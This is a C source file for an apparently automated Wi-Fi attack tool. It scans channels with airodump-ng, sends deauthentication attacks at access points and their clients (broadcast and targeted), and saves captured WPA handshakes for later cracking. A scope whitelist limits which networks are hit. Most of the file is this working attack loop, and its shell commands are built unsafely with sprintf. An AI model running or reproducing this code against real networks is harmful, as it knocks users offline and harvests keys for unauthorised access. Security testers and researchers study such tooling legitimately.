#include "collection.h"

AP** APs = NULL;
int* num_APs = NULL;
char** channels = NULL;
int num_channels = 0;
char* wireless_device = NULL;
int scanning_state = 0;
char** scope = NULL;
int num_targets = 0;

WINDOW* menu = NULL;
WINDOW* data = NULL;
bool new_data = false;
extern step;

void sig_handler(int signal){
    //turn off scanning if timeout (alarm) has gone off
    if(signal == SIGALRM){
        scanning_state = 0;
    }
    //SIGUSR1 is thrown by child processes if something has gone wrong
    else if(signal == SIGUSR1){
        printf("ERROR RUNNING SUB-COMMAND\n");
        tear_down();
        memory_cleanup();
        exit(1);
    }
    //before exiting, print report
    else if(signal == SIGINT){
        printf("SIGINT CAUGHT\n");
        printReport();
        tear_down();
        memory_cleanup();
        exit(1);
    }
}

int main(int argc, char* argv[]){
    //initialize value to zero
    num_channels = 0;
    //get wireless device name
    wireless_device = getWirelessDevice();
    if(wireless_device == NULL){
        printf("ERORR: NO WIRELESS DEVICES FOUND\n");
        exit(1);
    }
    //initialize variables and allocate memory
    initVals();
    
    //start scanning through channels
    for(int iteration = 1; iteration <= 5; iteration++){
        for(int c = 0; c < 13; c++){
            print_menu(c);
            wclear(data);
            //prep filenames for use by commands
            char prefix [50] = "";
            //full csv file name
            char file_name [57] = "";
            //pcap file name
            char capture_name [57] = "";
            sprintf(prefix, "scanning-%s", channels[c]);
            sprintf(file_name, "%s-%02d.csv", prefix, 01);
            sprintf(capture_name, "%s-%02d.cap", prefix, 01);
            
            //print out fresh data table
             new_data = true;
            //start airodump-ng scans
            int airodump_pid = startAirodumpScan(prefix, channels[c]);
            //use this file pointer to wait until airodump-ng has produced any output
            FILE* temp_wait = NULL;
            //file pointer will be non-NULL once file is available (busy-wait)
            while( (temp_wait = fopen(file_name,"r")) == NULL);
            //close file pointer
            fclose(temp_wait);
            scanning_state=1;
            //start timeout timer
            alarm(SCANNING_TIMEOUT);//once time is done, scanning state will be turned off, terminating while loop
            //while scanning, read in data and attack APs w/ or w/o clients
            bool attack_success = false;
            
            while(scanning_state){
                //read in AP/station data from a CSV
                readCSV(file_name);
                //print out read data
                if(new_data || step != STEP_SCANNING){
                    step = STEP_SCANNING;
                    print_data(c, NULL, NULL);
                }
                new_data = false;
                //attack the APs
                attack_success |= attackAPs(c, capture_name);
            }
            stopAirodumpScan(airodump_pid);
            //check keys one last time after handshake timeout expires
            checkKey(APs[c], num_APs[c], file_name);

            //clear out attacked booleans for clients
            for(int a = 0; a < num_APs[c]; a++)
                for(int client = 0; client < APs[c][a].num_clients; client++)
                    APs[c][a].clients[client].attacked = false;
            
            //If a handshake was collected store EAPOL packets
            if(attack_success)
                savePackets(capture_name);
            //Delete channel CSV and packet capture
            else
                file_cleanup(capture_name, file_name);
        }
    }
    //free up allocated memory
    memory_cleanup();
    return 0;
}

void initVals(){
    //get available channels
    channels = getCompatibleChannels(&num_channels, wireless_device);
    //if no channels found, error with wireless device
    if(num_channels == 0){
        printf("ERROR: WIRELESS DEVICE ERROR\n");
        exit(1);
    }

    //allocate space for the AP data based on num of channels
    APs = (AP**) malloc(sizeof(AP*) * num_channels);
    for(int i = 0; i < num_channels; i++){
        APs[i] = NULL;
    }

    //allocate space for the channel data
    num_APs = (int*) malloc(sizeof(int) * num_channels);
    for(int i = 0; i < num_channels; i++){
        num_APs[i] = 0;
    }

    //initialize screen
    init_screen(0, 0);

    //setup signal handlers (descriptions in handler)
    signal(SIGALRM, sig_handler);
    signal(SIGUSR1, sig_handler);
    signal(SIGINT, sig_handler);

    //open whitelist file
    FILE* list = fopen("whitelist.list", "r");
    //establish buffer size
    size_t buffer_sz = BSSID_LENGTH, line_length = 0;
    //allocate buffer
    char* buffer = (char*)malloc(sizeof(char)*buffer_sz);
    printf("Whitelisting:\n");
    //read in line by line
    while( (line_length = getline(&buffer, &buffer_sz, list)) != -1){
        //if line has newline character (or is too long), cut off excess
        buffer[17]='\0';
        //write out target to STDOUT
        printf("\t%s\n", buffer);
        //tally target count
        num_targets+=1;
        //if scope is a null pointer, malloc
        if(scope == NULL)
            scope = (char**)malloc(sizeof(char*));
        //otherwise realloc
        else
            scope = realloc(scope, sizeof(char*)*num_targets);
        //copy string bytes from whitelist into scope array
        scope[num_targets-1] = strdup(buffer);
        
    }
    fclose(list);
    free(buffer);
}
void memory_cleanup(){
    //Once done, start freeing memory
    printf("cleaning up\n");
    //cleanup all the APs
    for(int c = 0; c < num_channels; c++){
        for(int a = 0; a < num_APs[c]; a++)
            destroyAP(APs[c][a]);
        free(APs[c]);
    }
    for(int s=0; s < num_targets; s++){
        free(scope[s]);
    }
    free(scope);

    free(APs);
    //free integer array
    free(num_APs);
    //free wireless device name
    free(wireless_device);
    //free up channel data
    for(int c = 0; c < num_channels; c++)
        free(channels[c]);
    free(channels);
}
void file_cleanup(char* cap, char* csv){
    char command[100] = ""; 
    FILE* commands;
    //run rm on both pcap and csv file
    sprintf(command, "rm %s %s", csv, cap);
    commands = popen(command, "r");
    if(commands == NULL){
        printf("ERROR: DELETING CSV AND/OR PCAP FILE(S)\n");
    }
    pclose(commands);
}
int startAirodumpScan(char* prefix, char*  channel){
    char command[75];
    int dev_null = -1;
    //run airodump on specific channel with only associated clients and only output a cap and csv file
    sprintf(command, "airodump-ng -a -c %s -w %s -o csv,cap %s", channel, prefix, wireless_device);
    //printf("Command: %s\n", command);
    pid_t pid = fork();
    switch(pid){
        case -1: //error
            printf("Error running command\n");
            exit(1);
            break;
        case 0: //child
            //hide output of scanning
            dev_null = open("/dev/null", O_WRONLY);
            dup2(dev_null, 1);
            dup2(dev_null, 2);
            close(dev_null);
            
            //run scanning TODO: check if not running sudo
            execl("/bin/bash", "sh", "-c", command, NULL);
            printf("error runnnig scan\n");
            kill(getppid(), SIGUSR1);
            exit(1);
            break;
        default: //parent
            break;
    }
    return pid;
}
void stopAirodumpScan(int pid){
    //kill off children
    int status = -1;
    //try to terminate gracfeully
    kill(pid, SIGTERM);
    sleep(1);
    //if not terminated
    waitpid(pid, &status, WNOHANG);
    //kill forcefully
    kill(pid, SIGKILL);
}
bool attackAPs(int channel, char* capture_name){
    //get list of APs on a specific channel
    AP* victims = APs[channel];
    bool key_captured = false;
    //iterate through all APs on channel
    for(int a = 0; a < num_APs[channel]; a++){
        //If key was already captured for this AP, skip it
        if(victims[a].keyCaptured) continue;

        //get BSSID of AP in string format
        char victim_BSSID[18] = "";
        BSSID_TO_STRING(&victims[a].bssid, victim_BSSID); 

        //check the whitelisting
        int i=0;
        for(i=0; i < num_targets; i++){
            if(memcmp(victim_BSSID, scope[i], BSSID_LENGTH) == 0) break;
        }
        //skip if target is not whitelisted
        if(i == num_targets) continue;
        //if handshake already captured... skip
        if(victims[a].keyCaptured) continue;
        //check if AP has not been attacked and has no clients
        if(!victims[a].attacked && victims[a].num_clients == 0){
            //reset alarm to allow time to attack
            alarm(0);
            //printf("Victim found: %s\n", victim_BSSID);
            step = STEP_ATTACKING;
            print_data(channel, &victims[a].bssid, NULL);
            //run a non-targeted attack
            runDeauth(victim_BSSID, "00:00:00:00:00:00");   
            //mark victim as attacked
            victims[a].attacked=true;
            //check to see if handshake was captured
            msleep(HADNSHAKE_SLEEP);
            key_captured |= checkKey(victims, num_APs[channel], capture_name);
            //allow alarm time to look for other targets on channel
            alarm(POST_ATTACK_TIMEOUT);
        }
        //check if AP has clients
        else if(victims[a].num_clients > 0){
            //iterate through clients
            for(int c = 0; c < victims[a].num_clients; c++){
                //If client has already been attacked too many times, skip over it
                if(victims[a].clients[c].attack_count == MAX_ATTACK) continue;
                if(victims[a].clients[c].attacked) continue; //only attack once per rotation
                if(victims[a].keyCaptured) break;
                //store client's bssid in string format
                step = STEP_ATTACKING;
                print_data(channel, &victims[a].bssid, &victims[a].clients[c].bssid);
                char client_BSSID[18] = "";
                BSSID_TO_STRING(&victims[a].clients[c].bssid, client_BSSID);
                if(strcmp(client_BSSID, "74:04:F1:86:7E:91") == 0){
                    wprintw(data,"skipping over blacklist\n");
                    continue;
                }                
                //reset alarm to allow time to attack
                alarm(0);
                //deauth client from AP
                runDeauth(victim_BSSID, client_BSSID);
                victims[a].clients[c].attack_count++;
                //mark victim as attacked
                victims[a].attacked=true;
                victims[a].clients[c].attacked = true;
                //check to see if handshake was captured
                msleep(HADNSHAKE_SLEEP);
                key_captured |= checkKey(victims, num_APs[channel], capture_name);
                //allow alarm time to look for other targets on channel
                alarm(POST_ATTACK_TIMEOUT);
            }
        }
    }
    return key_captured; //if no keys captured
}